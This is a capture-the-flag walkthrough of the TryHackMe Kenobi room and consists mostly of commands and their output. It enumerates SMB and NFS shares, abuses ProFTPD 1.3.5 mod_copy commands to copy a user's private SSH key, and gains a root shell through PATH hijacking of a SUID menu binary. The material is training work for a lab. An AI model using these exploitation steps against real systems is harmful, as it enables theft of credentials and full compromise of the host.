# Try Hack Me - Kenobi

This is a walkthrough of the [Kenobi Room](https://tryhackme.com/room/kenobi), a guided CTF from [Try Hack Me](https://tryhackme.com/).

This CTF was carried out using a local install of Kali Linux. The machine to be exploited was accessed by VPN.

Once the kenobi virtual machine started and the IP address was displayed I assigned the address to a variable to use for the duration of the excercise.

```bash
$ IPADDR=<ip address of vm given by tryhackme>
```
## Initial scan for open ports
An initial scan of open TCP ports on the machine was carried out using nmap.

```bash
$ nmap -sT -oN nmap_ports.txt $IPADDR
```

The scan results tell us that there are 7 ports open.

```txt
# nmap_ports.txt

# Nmap 7.91 scan initiated Wed Mar 24 09:53:47 2021 as: nmap -sT -oN nmap_ports.txt 10.10.203.161
Nmap scan report for 10.10.203.161
Host is up (0.061s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

# Nmap done at Wed Mar 24 09:53:48 2021 -- 1 IP address (1 host up) scanned in 0.91 seconds
```
## Enumeration of SMB shares
Using the built in scripting features of nmap the SMB shares and users are enumerated.

```bash
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmap_snb.txt $IPADDR
```

```txt
# nmap_snb.txt

Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-24 09:55 GMT
Nmap scan report for 10.10.203.161
Host is up (0.029s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.203.161\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.203.161\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.203.161\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 6.31 seconds
```
The anonymous share maps onto a folder under kenobi's account.

## Examining SMB share
Login to the anonymous share and list directory contents.

```bash
$ smbclient //10.10.203.161/anonymous
Enter WORKGROUP\james's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Wed Sep  4 11:56:07 2019
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9204224 blocks of size 1024. 6877108 blocks available
smb: \> 
```

Download the contents of the share (a single file called log.txt)

```bash
$ smbget -R  smb://10.10.203.161/anonymous                                                                                                                         
Password for [james] connecting to //anonymous/10.10.203.161: 
Using workgroup WORKGROUP, user james
smb://10.10.203.161/anonymous/log.txt                                                                                                                                    
Downloaded 11.95kB in 2 seconds
```

## log.txt
View the contents of log.txt using less
```bash
$ less log.txt
```
Key information from log.txt
```txt
# log.txt

...
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
...
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
...

```
We have the location of kenobi's ssh keys and also the name of the FTP server.

## Enumerating NFS
Using the built in scripting features of nmap we can enumerate the NFS service.

```
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.203.161

Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-24 10:05 GMT
Nmap scan report for 10.10.203.161
Host is up (0.083s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
```
The /var directory is mounted using nfs.
```
$ nc 10.10.158.95 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.158.95]
```

```
$ searchsploit proftpd 1.3.5
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                              | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                    | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                              | linux/remote/36742.txt
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
## Finding an exploit
Using netcat we can login to the FTP server on port 21 to establich the version of ProFTPD.
```
$ nc $IPADDR 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.158.95]
```
We can then check for any known exploits using searchsploit.
```
$ searchsploit proftpd 1.3.5
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                              | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                    | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                              | linux/remote/36742.txt
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
We look specific information on the File Copy exploit.

```
$ searchsploit -m 36742     
  Exploit: ProFTPd 1.3.5 - File Copy
      URL: https://www.exploit-db.com/exploits/36742
     Path: /usr/share/exploitdb/exploits/linux/remote/36742.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /home/james/thm/kenobi/36742.txt
```

```
$ cat 36742.txt                               
Description TJ Saunders 2015-04-07 16:35:03 UTC
Vadim Melihow reported a critical issue with proftpd installations that use the
mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands
to be used by *unauthenticated clients*:
...
```
The file details how an unathenticated user can the CPFR (copy from) and CPTO (copy to) commands. With this knowledge we can use the exploit to copy files to /var which we can then mount on the attack machine as an NFS.

## Using the exploit
Using netcat again we can login to the FTD server and use the CPFR and CPTO commands to move kenobi's ssh key to /var.

```
$ nc $IPADDR 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.158.95]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
^C
```
We can now mount the nfs on the attack machine.
```
$ sudo mkdir /mnt/kenobiNFS
$ sudo mount $IPADDR:/var /mnt/kenobiNFS
$ ls -la /mnt/kenobiNFS 
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Mar 25 08:15 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Mar 25 08:13 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www
```
We take a copy of the key and set the correct permissions.
```
$ cp /mnt/kenobiNFS/tmp/id_rsa .                                        
$ sudo chmod 600 id_rsa   
```

## Login via SSH and finding user flag
We can now login as kenobi using ssh
```
$ ssh -i id_rsa kenobi@$IPAADR
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
[FLAG NOT SHOWN]
```
## Finding the root flag
The hint in the room tells us to look for an SUID binary.
```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
/usr/bin/menu stands out as not bing part of a normal linux installation. 
```
kenobi@kenobi:~$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :^C
```
A simple menu driven application to configure something.  
```
kenobi@kenobi:~$ strings /usr/bin/menu 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
```
Using strings shows that the menu application calls curl but doesn't specify an absolute path. This can be manipulated.
```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
```
We created a small one line script in /tmp called curl. The script simply calls /bin/sh. We update PATH to include /tmp. We could have similarly manipulated uname or ifconfg.
```
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# kenobi@kenobi:~$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :^C
/bin/sh: 1: kenobi@kenobi:~$: not found
# # # /bin/sh: 1: 1.: not found
# /bin/sh: 2: 2.: not found
# /bin/sh: 3: 3.: not found
# # id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```
Calling the /usr/bin/menu and choosing option 1 runs /tmp/curl which gives us a root shell.  
  
Finally we can get the root flag.
```
cat /root/root.txt
[FLAG NOT SHOWN]



